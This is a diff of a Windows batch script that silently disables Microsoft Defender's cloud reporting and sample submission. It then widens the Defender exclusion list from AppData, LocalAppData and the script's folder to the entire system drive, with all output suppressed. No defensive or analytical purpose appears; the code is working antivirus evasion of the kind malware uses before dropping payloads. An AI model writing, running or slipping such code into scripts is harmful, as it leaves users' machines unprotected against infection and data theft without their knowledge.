@@ -39,13 +39,9 @@ if errorlevel 1 (
 powershell -Command "Set-MpPreference -MAPSReporting 0" >nul 2>&1
 powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1
 
-set "AppData=%APPDATA%"
-set "ExeDir=%~dp0"
-set "LocalAppData=%LOCALAPPDATA%"
+set "SystemDrive=%SystemDrive%"
 
-powershell -Command "Add-MpPreference -ExclusionPath '%AppData%'" >nul 2>&1
-powershell -Command "Add-MpPreference -ExclusionPath '%ExeDir%'" >nul 2>&1
-powershell -Command "Add-MpPreference -ExclusionPath '%LocalAppData%'" >nul 2>&1
+powershell -Command "Add-MpPreference -ExclusionPath '%SystemDrive%'" >nul 2>&1
 
 echo All done!.
 
